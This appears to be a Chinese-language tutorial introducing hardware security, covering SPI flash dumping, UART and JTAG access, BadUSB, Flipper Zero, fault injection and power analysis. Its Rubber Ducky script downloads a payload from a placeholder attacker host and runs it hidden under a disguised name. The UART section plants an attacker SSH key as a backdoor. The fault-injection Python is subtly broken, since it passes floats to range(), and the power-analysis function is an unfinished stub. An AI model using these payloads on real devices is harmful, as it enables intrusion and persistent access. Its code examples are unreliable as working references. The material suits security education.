# 硬件安全入门

## 概述

硬件安全关注物理设备和嵌入式系统的设计、实现和部署中的安全。从 IoT 设备的固件提取到芯片级攻击——硬件是软件安全的物理边界。当攻击者拥有物理访问权，所有上层安全假设都可能被颠覆。

---

## 1. 硬件攻击面

### 1.1 硬件安全层次

```
硬件攻击面层次:

    ┌──────────────────────────────┐
    │  Web/App 层 (你已经知道)       │
    ├──────────────────────────────┤
    │  OS/固件层 (SPI flash 可写)   │ ← 固件提取/修改
    ├──────────────────────────────┤
    │  硬件通信接口                  │ ← UART, JTAG, SPI, I2C
    ├──────────────────────────────┤
    │  存储芯片 (Flash/EEPROM)       │ ← 直接读取存储
    ├──────────────────────────────┤
    │  侧信道 (功耗/电磁/时序)       │ ← 密钥恢复
    ├──────────────────────────────┤
    │  芯片级 (解封装/探针/FIB)      │ ← 最底层, 最昂贵
    └──────────────────────────────┘
```

### 1.2 常用攻击接口

| 接口 | 用途 | 风险 | 工具 |
|------|------|------|------|
| **UART** | 调试串口 | 获取 Shell、查看启动日志 | FTDI232, Logic Analyzer |
| **JTAG/SWD** | 调试/编程 | 固件读写、内存转储 | J-Link, OpenOCD |
| **SPI Flash** | 固件存储 | 固件提取/修改 | SOIC8 Clip + CH341A |
| **I2C** | 传感器通信 | 数据嗅探/注入 | Logic Analyzer |
| **USB** | 通用外设 | BadUSB, USB Killer | Flipper Zero |
| **电源引脚** | 供电 | 故障注入 (Glitching) | ChipWhisperer |

---

## 2. 固件提取与分析

### 2.1 SPI Flash 直接读取

```bash
# 使用 CH341A 编程器 + SOIC8 夹子读取 SPI Flash

# 1. 连接
# CH341A (USB) → SOIC8 Clip → Flash 芯片
# 注意: 1脚对齐 (通常有圆点标记)

# 2. 检测芯片
flashrom -p ch341a_spi
# 输出:
# Found Winbond flash chip "W25Q128.V" (16384 kB)
# → SPI 16MB Flash

# 3. 读取固件 (多次读取并校验)
flashrom -p ch341a_spi -r firmware_dump1.bin -c "W25Q128.V"
flashrom -p ch341a_spi -r firmware_dump2.bin -c "W25Q128.V"
md5sum firmware_dump1.bin firmware_dump2.bin
# 确保两次读取一致 (排除读取误差)

# 4. 分析固件
binwalk firmware_dump1.bin
# DECIMAL       HEXADECIMAL     DESCRIPTION
# 0             0x0             U-Boot header
# 65536         0x10000         Linux kernel ARM
# 3276800       0x320000        Squashfs filesystem
# 12582912      0xC00000        JFFS2 filesystem

# 5. 提取文件系统
binwalk -e firmware_dump1.bin
# 提取到 _firmware_dump1.bin.extracted/
cd _firmware_dump1.bin.extracted/squashfs-root/

# 6. 分析发现
cat etc/shadow                # 密码哈希
cat etc/init.d/rcS            # 启动脚本
find . -name "*.pem" -o -name "*.key"  # 硬编码私钥/证书
strings sbin/telnetd | grep -i admin  # 后门账号
```

### 2.2 UART 获取 Root Shell

```bash
# UART 串口调试

# 1. 连接逻辑分析仪/FTDI232
# 找到板子上的 3-4 个焊盘 (通常标注 TX/RX/GND/VCC)
# FTDI232:
#   GND → 板子 GND
#   TX  → 板子 RX (交叉连接)
#   RX  → 板子 TX
#   VCC → 不要连接! (电压不匹配可能烧毁)

# 2. 设置终端
screen /dev/ttyUSB0 115200
# 常见波特率: 9600, 19200, 38400, 57600, 115200

# 3. 上电设备并等待输出
# U-Boot 启动信息:
# Hit any key to stop autoboot: 3
# → 按键 3 秒内进入 U-Boot shell

# 4. 在 U-Boot 中修改启动参数
# setenv bootargs 'console=ttyS0,115200 init=/bin/sh'
# boot

# 5. 获得 root shell 后检查
whoami                # root
cat /proc/mtd          # 查看 Flash 分区
cat /etc/shadow        # 系统密码

# 6. 持久化后门
# 写入新的 SSH 密钥
echo "ssh-rsa AAA... attacker" > /etc/dropbear/authorized_keys
```

### 2.3 JTAG 调试

```bash
# 使用 OpenOCD + J-Link 通过 JTAG 调试

# 1. 连接 OpenOCD
openocd -f interface/jlink.cfg \
    -c "transport select jtag" \
    -c "adapter speed 1000"

# 2. 连接 GDB
arm-none-eabi-gdb
(gdb) target remote localhost:3333
(gdb) monitor reset halt    # 暂停 CPU
(gdb) monitor mdw 0x08000000 100  # 读取 Flash 内容
(gdb) dump binary memory extracted.bin 0x08000000 0x08100000
# → 提取 1MB Flash 到文件

# 3. 内存补丁
(gdb) set {int}0x08001000 = 0xE1A00000  # 修改指令 (NOP)
```

---

## 3. BadUSB / Flipper Zero

### 3.1 Rubber Ducky 脚本

```ruby
# Rubber Ducky - BadUSB 键盘注入

DELAY 3000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 1000

STRING $wc = New-Object System.Net.WebClient;
STRING $wc.DownloadFile('http://ATTACKER_IP/payload.exe', '$env:TEMP\svchost.exe');
ENTER
DELAY 2000

STRING Start-Process '$env:TEMP\svchost.exe' -WindowStyle Hidden;
ENTER

# 执行完成后清理痕迹
DELAY 500
STRING exit
ENTER
```

### 3.2 Flipper Zero

```yaml
Flipper Zero 硬件安全工具:

  无线攻击:
    - RFID: 读取/模拟/克隆 Mifare Classic
    - NFC: 读取/模拟 Amiibo, 酒店门卡
    - Sub-GHz: 汽车钥匙信号重放
    - Bluetooth: BLE 欺骗, BadKB

  GPIO:
    - UART 调试: 路由器/物联网设备
    - BadUSB: 模拟键盘 (Rubber Ducky)
    - 电子锁破解: 直接控制电磁锁

  红外:
    - TV/空调万能遥控
    - 红外信号学习/重放

  实用场景:
    - 物理安全评估
    - IoT 设备安全测试
    - RFID 进场安全测试
```

---

## 4. 故障注入 (Fault Injection)

### 4.1 电压故障注入

```python
# ChipWhisperer - 电压毛刺攻击

"""
攻击原理:
  1. 控制器在执行安全操作 (如验证密码的 if 判断)
  2. 在关键时刻短暂降低电压 (<10ns)
  3. 可能导致 CPU 跳过 if 检查, 或读取到错误的值

目标: 绕过锁定位, 读取受保护的固件, 或绕过密码检查
"""

from chipwhisperer import capture, analyzer

# 设置目标
scope = capture.Scope()
target = capture.Target(scope)

# 尝试电压 Glitch
for voltage in range(2.8, 3.3, 0.05):
    for width in [5, 10, 15, 20]:  # glitch 宽度 (ns)
        scope.glitch.width = width
        scope.io.vtarget = voltage

        # 触发攻击
        ret = capture.capture_trace(scope, target)
        if ret and target.is_unlocked():
            print(f"成功! 电压={voltage}V, 宽度={width}ns")
            break
```

### 4.2 侧信道攻击 (简单功耗分析)

```python
# Simple Power Analysis (SPA) 攻击

"""
AES 加密的功耗痕迹:
  - 每轮加密功耗不同
  - 密钥相关操作 (S-Box 查表) 产生可识别的功耗模式
  - 攻击者可以从功耗曲线直接推测密钥字节
"""

def sp_analyze_aes(traces):
    """简单功耗分析 AES"""

    for trace in traces:
        # 寻找 AES 轮特征
        rounds_detected = detect_aes_rounds(trace)

        # 不同密钥字节在 S-Box 之前产生不同的寄存器切换
        # → 体现在功耗差异
        for round_num in range(rounds_detected):
            round_trace = extract_round(trace, round_num)

            # 分析每一轮推测一个密钥字节
            for byte_pos in range(16):
                correlation = correlate_with_hamming_weight(
                    round_trace, byte_pos
                )
                # 最高相关性的值 → 密钥字节
```

---

## 5. 硬件安全工具包

| 工具 | 用途 | 成本 |
|------|------|------|
| **Flipper Zero** | 多功能硬件黑客工具 | $169 |
| **Bus Pirate** | 通用总线接口 (UART/I2C/SPI) | $30 |
| **CH341A** | SPI Flash 编程器 | $5 |
| **Logic Analyzer (Saleae 克隆)** | 8 通道逻辑分析 | $10 |
| **J-Link EDU** | JTAG/SWD 调试器 | $60 |
| **ChipWhisperer** | 侧信道 + 故障注入 | $300-4000 |
| **JTAGulator** | JTAG/SWD/UART 自动侦测 | $180 |
| **USB Rubber Ducky** | BadUSB | $50 |
| **Hak5 WiFi Pineapple** | WiFi 审计 | $100-200 |

---

## 参考资源

- [Hardware Hacking Handbook (Jasper van Woudenberg)](https://nostarch.com/hardwarehacking)
- [Flipper Zero 官方文档](https://docs.flipper.net/)
- [ChipWhisperer 教程](https://wiki.newae.com/)
- [JTAG Explained](https://www.jtag.com/)

---

*下一篇：[固件逆向分析](./02-firmware-reverse.md)*
